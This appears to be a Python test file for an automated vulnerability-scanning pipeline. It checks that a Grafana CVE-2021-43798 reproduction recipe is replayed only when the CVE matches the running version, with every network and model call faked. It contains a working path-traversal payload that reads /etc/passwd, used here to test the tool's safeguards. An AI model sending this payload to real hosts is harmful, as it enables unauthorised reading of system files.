"""The recipe-driven CVE reproduction chain, end to end offline.

Once a host is identified as a known product at a version, a CVE the lookup tied to that version
has a recorded read-only reproduction, so the finding grounds on the recipe's request directly,
without having observed it during recon. This drives the whole spine, identify, cve lookup, triage,
recipe grounding, the intrusive read-only EXPLOIT replay, and the confirm regrade, with faked seams
and a canned model, so no test touches a network, a model, or Docker. The verdict stays the model's,
the provider is canned, the deterministic contract is that a version-matched CVE with a recipe
grounds and replays its recipe request, and a product-wide match does not.
"""

from __future__ import annotations

import json

from opfor.core import Budget, CompletionResult, Phase, Provider, Scope, run
from opfor.scenarios.attacksurface.assets.domain.sources.observations import Response
from tests.surface_fixtures import HostScope, ROOT, _make, _seed

# The host the fixture surface identifies as Grafana, so the recipe for CVE-2021-43798 applies to it.
TARGET = "admin.example.com"
# the path the vendored Nuclei template carries, its first candidate, alertlist plugin traversal
_TRAVERSAL = "/public/plugins/alertlist/" + "../" * 19 + "etc/passwd"
_PASSWD = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"

_KNOWN_VULN_FINDING = json.dumps({"findings": [{
    "category": "known-vulnerability",
    "title": "Grafana path traversal CVE-2021-43798",
    "severity": "HIGH",
    "where": f"https://{TARGET}/",
    "evidence": "Grafana 8.3.0 identified, CVE-2021-43798 matched to the running version",
    "poc": "requires authorized exploitation: exploit the CVE-2021-43798 path traversal",
    "confidence": 0.9,
}]})
_CONFIRMED = json.dumps({
    "verdict": "confirmed", "severity": "CRITICAL",
    "reason": "the reproduction returned an /etc/passwd body with a root: line"})


class ChainProvider(Provider):
    """A canned model that answers triage and confirm apart by their system prompt, so one provider
    drives both halves of the spine. Triage returns the known-vulnerability finding only for a chunk
    that carries the target host, so a chunk without it mints nothing rather than a dropped finding.
    Confirm returns the confirmed verdict."""

    def __init__(self) -> None:
        self.calls: list[dict] = []

    def complete(self, *, system, messages, model, max_tokens, cache=False) -> CompletionResult:
        self.calls.append({"system": system, "content": messages[0].content})
        if "confirmation judge" in system:
            return CompletionResult(text=_CONFIRMED)
        if TARGET in messages[0].content:
            return CompletionResult(text=_KNOWN_VULN_FINDING)
        return CompletionResult(text='{"findings": []}')


# The Metabase shape: triage headlines a more severe CVE the recipe set does not cover, while the
# lookup also tied a reproducible CVE to the version. The file read recipe must not be stapled onto
# this finding, which the confirm judge would then rightly weaken.
_RCE_FINDING = json.dumps({"findings": [{
    "category": "known-vulnerability",
    "title": "Grafana 8.3.0 is in the affected range for unauthenticated RCE CVE-2099-0001",
    "severity": "CRITICAL",
    "where": f"https://{TARGET}/",
    "evidence": "Grafana 8.3.0 identified, CVE-2099-0001 unauthenticated RCE matched to the version",
    "poc": "requires authorized exploitation: exploit the CVE-2099-0001 remote code execution",
    "confidence": 0.9,
}]})


class RCEProvider(ChainProvider):
    """Triage headlines a CVE the recipe set does not cover, so grounding must not fire on it."""

    def complete(self, *, system, messages, model, max_tokens, cache=False) -> CompletionResult:
        self.calls.append({"system": system, "content": messages[0].content})
        if "confirmation judge" in system:
            return CompletionResult(text=_CONFIRMED)
        if TARGET in messages[0].content:
            return CompletionResult(text=_RCE_FINDING)
        return CompletionResult(text='{"findings": []}')


def _identify_grafana(evidence):
    return {"product": "Grafana", "version": "8.3.0", "cpe": "grafana:grafana"}


def _cves_version_matched(product, version, cpe=""):
    return [{"id": "CVE-2021-43798", "cvss": 7.5, "severity": "HIGH",
             "summary": "arbitrary file read via path traversal", "match": "version"}]


def _cves_product_only(product, version, cpe=""):
    # the same CVE found on a product-wide basis, not tied to the running version
    return [{"id": "CVE-2021-43798", "cvss": 7.5, "severity": "HIGH",
             "summary": "arbitrary file read via path traversal", "match": "product"}]


def _reproduce_passwd(url):
    # the intrusive read-only replay seam: the traversal reads /etc/passwd, anything else is a 404
    if _TRAVERSAL in url:
        return Response(status=200, url=url, content_type="text/plain", body=_PASSWD)
    return Response(status=404, url=url)


def _run_chain(cve_fn):
    provider = ChainProvider()
    scenario = _make(confirm=True, identify_fn=_identify_grafana, cve_fn=cve_fn,
                     provider=provider, reproduce_fetch_fn=_reproduce_passwd)
    world = _seed()
    scope = Scope(max_tier="intrusive", matcher=HostScope(hosts=(ROOT,)), authorized=True)
    report = run(scenario, world, scope=scope, budget=Budget(5000), retry_backoff=0.0)
    return report, world


def _known_vuln(report):
    return next((f for f in report.findings
                 if f.data.get("kind") == "known-vulnerability" and TARGET in f.where), None)


def test_a_version_matched_cve_grounds_on_its_recipe_and_confirms_read_only():
    report, world = _run_chain(_cves_version_matched)
    assert report.closed and report.reached == Phase.CONFIRM

    finding = _known_vuln(report)
    assert finding is not None, "the known-vulnerability finding was not reported"
    # the finding grounded on the recipe request, not an observed read, and the request is the
    # traversal the recipe encodes against the host's observed scheme and authority
    poc = finding.data.get("poc_request")
    assert poc is not None and poc["source"] == "reproduction:CVE-2021-43798"
    assert poc["url"] == f"https://{TARGET}{_TRAVERSAL}"

    # the intrusive EXPLOIT phase replayed exactly the recipe request, read only, and recorded it
    receipts = {f.about: f.payload for f in world.facts("reproduction")}
    receipt = receipts.get(finding.id)
    assert receipt is not None and receipt.method == "GET"
    assert receipt.url == f"https://{TARGET}{_TRAVERSAL}"
    assert "root:x:0:0" in receipt.excerpt

    # confirm regraded the finding on the live receipt, the verdict is the model's, not hardcoded
    assert finding.data["reproduction_verdict"] == "confirmed"
    assert finding.severity == "CRITICAL"


def test_a_product_wide_match_does_not_fire_the_recipe():
    # evidence over guessing: a CVE not tied to the running version is never replayed, so the
    # finding stays ungrounded and the intrusive phase reproduces nothing
    report, world = _run_chain(_cves_product_only)
    assert report.closed and report.reached == Phase.CONFIRM

    finding = _known_vuln(report)
    assert finding is not None
    assert "poc_request" not in finding.data
    assert world.facts("reproduction") == ()


def _cves_rce_and_reproducible(product, version, cpe=""):
    # the Metabase shape: a severe CVE with no recipe and a reproducible one, both version-matched
    return [{"id": "CVE-2099-0001", "cvss": 9.8, "severity": "CRITICAL",
             "summary": "unauthenticated remote code execution", "match": "version"},
            {"id": "CVE-2021-43798", "cvss": 7.5, "severity": "HIGH",
             "summary": "arbitrary file read via path traversal", "match": "version"}]


def test_a_recipe_is_not_grounded_onto_a_finding_about_a_different_cve():
    # the Metabase shape: triage headlines a severe CVE the recipe set does not cover, while the
    # lookup also tied a reproducible CVE to the running version. The file read recipe must not be
    # stapled onto the RCE finding, which the confirm judge would then rightly weaken, so it stays
    # ungrounded and the intrusive phase reproduces nothing for it.
    provider = RCEProvider()
    scenario = _make(confirm=True, identify_fn=_identify_grafana, cve_fn=_cves_rce_and_reproducible,
                     provider=provider, reproduce_fetch_fn=_reproduce_passwd)
    world = _seed()
    scope = Scope(max_tier="intrusive", matcher=HostScope(hosts=(ROOT,)), authorized=True)
    report = run(scenario, world, scope=scope, budget=Budget(5000), retry_backoff=0.0)
    assert report.closed and report.reached == Phase.CONFIRM

    finding = _known_vuln(report)
    assert finding is not None
    # the finding names CVE-2099-0001, which has no recipe, so the CVE-2021-43798 file read recipe is
    # not grounded onto it, and the intrusive phase replays nothing for it
    assert "poc_request" not in finding.data
    assert world.facts("reproduction") == ()
